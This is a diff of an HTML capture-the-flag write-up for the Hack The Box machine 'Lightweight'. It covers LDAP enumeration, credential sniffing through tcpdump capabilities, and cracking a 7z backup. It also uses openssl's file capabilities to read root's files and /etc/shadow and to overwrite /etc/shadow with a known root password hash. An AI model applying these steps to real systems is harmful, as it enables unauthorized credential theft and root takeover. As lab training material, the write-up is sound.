@@ -81,13 +81,13 @@
 
 <h2 id="quick-summary">Quick Summary</h2>
 <p><br> Hey guys today Lightweight retired and here’s my write-up about it. Lightweight was a simple and a straightforward machine, I had fun solving it and I liked it. The idea behind the box is simple, We get initial ssh access then keep escalating privileges until we reach root. It’s a linux machine and its ip is <code class="highlighter-rouge">10.10.10.119</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">lightweight.htb</code>. Let’s jump right in.
-<img src="/images/hackthebox/lightweight/0.png" alt=""></p>
+<br><img src="/images/hackthebox/lightweight/0.png" alt=""><br></p>
 <hr>
 
 <h2 id="nmap">Nmap</h2>
 <p><br> As always we will start with nmap to scan for open ports and services :
-<code class="highlighter-rouge">nmap -sV -sT -sC lightweight.htb</code>
-<img src="/images/hackthebox/lightweight/1.png" alt="">
+<br><code class="highlighter-rouge">nmap -sV -sT -sC lightweight.htb</code>
+<br><img src="/images/hackthebox/lightweight/1.png" alt=""><br>
 <br> 3 ports are open : 22 running ssh, 80 running http and 389 running ldap. Let’s check ldap first.
 <br></p>
 <hr>
@@ -95,7 +95,7 @@
 <h2 id="ldap-enumeration">Ldap Enumeration</h2>
 <p><br> To enumerate ldap I like to use a tool called <code class="highlighter-rouge">ldapsearch</code>, There’s also an <code class="highlighter-rouge">nmap</code> script called <code class="highlighter-rouge">ldap-search</code> that can do the same thing.
 <br> <code class="highlighter-rouge">ldapsearch</code> :
-<code class="highlighter-rouge">ldapsearch -x -h lightweight.htb -b "dc=lightweight,dc=htb"</code>
+<br><code class="highlighter-rouge">ldapsearch -x -h lightweight.htb -b "dc=lightweight,dc=htb"</code>
 <br> Full Output :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># extended LDIF
 #
@@ -200,7 +200,7 @@ result: 0 Success
 
 </code></pre></div></div>
 <p><br> <code class="highlighter-rouge">nmap</code> :
-<code class="highlighter-rouge">nmap --script=ldap-search lightweight.htb</code>
+<br><code class="highlighter-rouge">nmap --script=ldap-search lightweight.htb</code>
 <br> Full Output :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.70 scan initiated Fri May 10 17:10:46 2019 as: nmap --script=ldap-search -o ldap.nmap lightweight.htb
 Nmap scan report for lightweight.htb (10.10.10.119)
@@ -285,32 +285,30 @@ PORT    STATE SERVICE
 
 </code></pre></div></div>
 <p><br> If we take a look at <code class="highlighter-rouge">ldapsearch</code> results :
-<img src="/images/hackthebox/lightweight/2.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/lightweight/3.png" alt="">
+<br><img src="/images/hackthebox/lightweight/2.png" alt=""><br>
+<br><img src="/images/hackthebox/lightweight/3.png" alt=""><br>
 <br> We have some info for 2 users : <code class="highlighter-rouge">ldapuser1</code> and <code class="highlighter-rouge">ldapuser2</code>. <code class="highlighter-rouge">userPassword</code> is a base64 encoded string. I decoded it and got the same hashes I got from <code class="highlighter-rouge">ldap-search</code> <code class="highlighter-rouge">nmap</code> script :
-<img src="/images/hackthebox/lightweight/4.png" alt="">
+<br><img src="/images/hackthebox/lightweight/4.png" alt=""><br>
 <br> However, I tried to crack the hashes and they didn’t crack. Let’s check http.
 <br></p>
 <hr>
 
 <h2 id="http">HTTP</h2>
 <p><br> Usually I use some tools for web like <code class="highlighter-rouge">gobuster</code> for example, But this time We can’t do that because we will get blocked as you can see :
-<img src="/images/hackthebox/lightweight/5.png" alt="">
+<br><img src="/images/hackthebox/lightweight/5.png" alt=""><br>
 <br> Also the <code class="highlighter-rouge">info</code> page is saying the same thing :
-<img src="/images/hackthebox/lightweight/6.png" alt="">
+<br><img src="/images/hackthebox/lightweight/6.png" alt=""><br>
 <br> And it’s also saying <code class="highlighter-rouge">If you like to get in the box, please go to the user page</code>. Let’s check <code class="highlighter-rouge">user</code> :
-<img src="/images/hackthebox/lightweight/7.png" alt="">
+<br><img src="/images/hackthebox/lightweight/7.png" alt=""><br>
 <br> So we can login with ssh with the ip as the username and the password. Let’s try :
-<img src="/images/hackthebox/lightweight/8.png" alt="">
+<br><img src="/images/hackthebox/lightweight/8.png" alt=""><br>
 <br> It’s working !
 <br></p>
 <hr>
 
 <h2 id="tcpdump-capabilities-user-flag">Tcpdump Capabilities, User Flag</h2>
-<p><br> One of the things I always check when enumerating linux filesystem is the binary capabilities. So I used <code class="highlighter-rouge">getcap</code> on some directories like <code class="highlighter-rouge">/bin</code>, <code class="highlighter-rouge">/usr/bin</code> and <code class="highlighter-rouge">/usr/sbin</code>. I noticed that <code class="highlighter-rouge">tcpdump</code> has <code class="highlighter-rouge">cap_net_admin,cap_net_raw+ep</code> capabilities.
-<img src="/images/hackthebox/lightweight/9.png" alt="">
+<p><br> One of the things I always check when enumerating linux filesystem is the binary capabilities. So I used <code class="highlighter-rouge">getcap</code> on some directories like <code class="highlighter-rouge">/bin</code>, <code class="highlighter-rouge">/usr/bin</code> and <code class="highlighter-rouge">/usr/sbin</code>. I noticed that <br><code class="highlighter-rouge">tcpdump</code> has <code class="highlighter-rouge">cap_net_admin,cap_net_raw+ep</code> capabilities.
+<br><img src="/images/hackthebox/lightweight/9.png" alt=""><br>
 <br> From the <a href="http://man7.org/linux/man-pages/man7/capabilities.7.html" target="_blank" rel="noopener noreferrer">Linux Capabilities Manual</a> I found some info about these capabilities :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>**CAP_NET_ADMIN**
               Perform various network-related operations:
@@ -332,21 +330,19 @@ PORT    STATE SERVICE
               * bind to any address for transparent proxying.
 </code></pre></div></div>
 <p><br> Great. I ran <code class="highlighter-rouge">tcpdump</code> on all the interfaces and saved the output to <code class="highlighter-rouge">captured.pcap</code> and I left it for some time :
-<code class="highlighter-rouge">tcpdump -i any -w captured.pcap</code>
-<img src="/images/hackthebox/lightweight/10.png" alt="">
+<br><code class="highlighter-rouge">tcpdump -i any -w captured.pcap</code>
+<br><img src="/images/hackthebox/lightweight/10.png" alt=""><br>
 <br> I downloaded the <code class="highlighter-rouge">pcap</code> on my box to open it with <code class="highlighter-rouge">wireshark</code> :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>scp 10.10.xx.xx@lightweight.htb:/home/10.10.xx.xx/captured.pcap ./
 </code></pre></div></div>
-<p><img src="/images/hackthebox/lightweight/11.png" alt="">
+<p><br><img src="/images/hackthebox/lightweight/11.png" alt=""><br>
 <br> In <code class="highlighter-rouge">wireshark</code> I noticed an <code class="highlighter-rouge">LDAP</code> request :
-<img src="/images/hackthebox/lightweight/12.png" alt="">
+<br><img src="/images/hackthebox/lightweight/12.png" alt=""><br>
 <br> I looked at it and found that it’s an authentication request :
-<img src="/images/hackthebox/lightweight/13.png" alt="">
+<br><img src="/images/hackthebox/lightweight/13.png" alt=""><br>
 <br> Now we have the password for <code class="highlighter-rouge">ldapuser2</code> :	<code class="highlighter-rouge">8bc8251332abe1d7f105d3e53ad39ac2</code>. Lets <code class="highlighter-rouge">su</code> :
-<img src="/images/hackthebox/lightweight/14.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/lightweight/15.png" alt="">
+<br><img src="/images/hackthebox/lightweight/14.png" alt=""><br>
+<br><img src="/images/hackthebox/lightweight/15.png" alt=""><br>
 <br> We owned user.
 <br></p>
 <hr>
@@ -354,57 +350,46 @@ PORT    STATE SERVICE
 <h2 id="bruteforcing-7z-hardcoded-credentials-privilege-escalation-to-ldapuser1">Bruteforcing <code class="highlighter-rouge">7z</code>, Hardcoded Credentials, Privilege Escalation to <code class="highlighter-rouge">ldapuser1</code>
 </h2>
 <p><br> In the <code class="highlighter-rouge">/home</code> directory of <code class="highlighter-rouge">ldapuser2</code> there was a backup file called <code class="highlighter-rouge">backup.7z</code>. I tried to extract it but it was password protected :
-<img src="/images/hackthebox/lightweight/16.png" alt="">
+<br><img src="/images/hackthebox/lightweight/16.png" alt=""><br>
 <br> So I transferred it to my box to bruteforce it (<code class="highlighter-rouge">nc</code> wasn’t installed and I couldn’t use <code class="highlighter-rouge">scp</code> so I transferred it with base64 encoding/decoding) :
-<img src="/images/hackthebox/lightweight/17.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/lightweight/18.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/lightweight/19.png" alt="">
+<br><img src="/images/hackthebox/lightweight/17.png" alt=""><br>
+<br><img src="/images/hackthebox/lightweight/18.png" alt=""><br>
+<br><img src="/images/hackthebox/lightweight/19.png" alt=""><br>
 <br> I used <a href="https://github.com/Seyptoo/7z-BruteForce" target="_blank" rel="noopener noreferrer">this tool</a> to bruteforce the <code class="highlighter-rouge">7z</code> file :
-<code class="highlighter-rouge">python 7z.py backup.7z /usr/share/wordlists/rockyou.txt</code>
-<img src="/images/hackthebox/lightweight/20.png" alt="">
+<br><code class="highlighter-rouge">python 7z.py backup.7z /usr/share/wordlists/rockyou.txt</code>
+<br><img src="/images/hackthebox/lightweight/20.png" alt=""><br>
 <br> The password is <code class="highlighter-rouge">delete</code>. After extraction we have some <code class="highlighter-rouge">php</code> files, Looks like the source of the web site hosted on port 80 :
-<img src="/images/hackthebox/lightweight/21.png" alt="">
+<br><img src="/images/hackthebox/lightweight/21.png" alt=""><br>
 <br> I checked them all and in <code class="highlighter-rouge">status.php</code> I found hardcoded credentials for <code class="highlighter-rouge">ldapuser1</code> :
-<img src="/images/hackthebox/lightweight/22.png" alt="">
+<br><img src="/images/hackthebox/lightweight/22.png" alt=""><br>
 <br> Now we can <code class="highlighter-rouge">su</code> to <code class="highlighter-rouge">ldapuser1</code> with the password : <code class="highlighter-rouge">f3ca9d298a553da117442deeb6fa932d</code> :
-<img src="/images/hackthebox/lightweight/23.png" alt=""></p>
+<br><img src="/images/hackthebox/lightweight/23.png" alt=""><br></p>
 <hr>
 
 <h2 id="openssl-capabilities-root-flag">Openssl Capabilities, Root Flag</h2>
 <p><br> I looked at the contents of <code class="highlighter-rouge">/home/ldapuser1</code> and I noticed some stuff. A <code class="highlighter-rouge">php</code> file called <code class="highlighter-rouge">ldapTLS.php</code> and two binaries : <code class="highlighter-rouge">openssl</code> and <code class="highlighter-rouge">tcpdump</code>.
-<img src="/images/hackthebox/lightweight/24.png" alt="">
-<br>
-<code class="highlighter-rouge">cat ldapTLS.php</code>
-<img src="/images/hackthebox/lightweight/25.png" alt="">
+<br><img src="/images/hackthebox/lightweight/24.png" alt=""><br>
+<br><code class="highlighter-rouge">cat ldapTLS.php</code>
+<br><img src="/images/hackthebox/lightweight/25.png" alt=""><br>
 <br> Nothing interesting. Lets check the binaries. (We don’t need <code class="highlighter-rouge">tcpdump</code> anymore so we will focus on <code class="highlighter-rouge">openssl</code>) 
 <br> I checked the capabilities and I found that <code class="highlighter-rouge">openssl</code> has the <code class="highlighter-rouge">ep</code> capability which means it can read and write anything on the filesystem. 
-<img src="/images/hackthebox/lightweight/26.png" alt="">
+<br><img src="/images/hackthebox/lightweight/26.png" alt=""><br>
 <br> This  means that we can simply read the root flag by using the base64 encoding function in <code class="highlighter-rouge">openssl</code> then decoding the file :
-<code class="highlighter-rouge">./openssl enc -base64 -in /root/root.txt -out ./root.txt.b64</code>
-<br>
-<br>
-<code class="highlighter-rouge">base64 -d root.txt.b64</code>
-<img src="/images/hackthebox/lightweight/27.png" alt="">
+<br><code class="highlighter-rouge">./openssl enc -base64 -in /root/root.txt -out ./root.txt.b64</code>
+<br><code class="highlighter-rouge">base64 -d root.txt.b64</code>
+<br><img src="/images/hackthebox/lightweight/27.png" alt=""><br>
 <br> We can also get a root shell by overwriting <code class="highlighter-rouge">/etc/passwd</code> or <code class="highlighter-rouge">/etc/shadow</code>. I got a copy of the original <code class="highlighter-rouge">shadow</code> file first :
-<code class="highlighter-rouge">./openssl enc -base64 -in /etc/shadow -out ./shadow.b64</code>
-<br>
-<br>
-<code class="highlighter-rouge">base64 -d shadow.b64 &gt; shadow</code>
-<br>
-<br>
-<img src="/images/hackthebox/lightweight/28.png" alt="">
+<br><code class="highlighter-rouge">./openssl enc -base64 -in /etc/shadow -out ./shadow.b64</code>
+<br><code class="highlighter-rouge">base64 -d shadow.b64 &gt; shadow</code>
+<br><img src="/images/hackthebox/lightweight/28.png" alt=""><br>
 <br> I used <code class="highlighter-rouge">openssl</code> to create a salted password. I used <code class="highlighter-rouge">root</code> as the salt and <code class="highlighter-rouge">rick</code> as the password :
-<code class="highlighter-rouge">openssl passwd -1 -salt root rick</code>
-<img src="/images/hackthebox/lightweight/29.png" alt="">
+<br><code class="highlighter-rouge">openssl passwd -1 -salt root rick</code>
+<br><img src="/images/hackthebox/lightweight/29.png" alt=""><br>
 <br> Then I edited the copy I have of <code class="highlighter-rouge">/etc/shadow</code> and replaced the root password with the new one :
-<img src="/images/hackthebox/lightweight/30.png" alt="">
+<br><img src="/images/hackthebox/lightweight/30.png" alt=""><br>
 <br> And finally I used <code class="highlighter-rouge">openssl</code> to replace the old <code class="highlighter-rouge">/etc/shadow</code> with the new one and after that we can do <code class="highlighter-rouge">su root</code> with the password <code class="highlighter-rouge">rick</code>:
-<code class="highlighter-rouge">./openssl enc -in shadow -out /etc/shadow</code>
-<img src="/images/hackthebox/lightweight/31.png" alt="">
+<br><code class="highlighter-rouge">./openssl enc -in shadow -out /etc/shadow</code>
+<br><img src="/images/hackthebox/lightweight/31.png" alt=""><br>
 <br> And we owned root !
 <br>
 <br>
